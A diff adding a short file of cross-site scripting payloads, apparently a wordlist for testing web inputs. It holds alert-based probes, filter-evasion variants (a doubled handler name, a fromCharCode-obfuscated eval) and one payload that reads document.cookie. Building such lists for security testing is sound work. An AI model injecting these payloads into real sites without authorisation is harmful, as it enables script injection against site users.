@@ -1,0 +1,18 @@
+# Cross-Site Scripting (XSS) Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+javascript:alert('XSS')
+<img src=x onerror=alert(1)>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+<img src=x oneonerrorrror=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
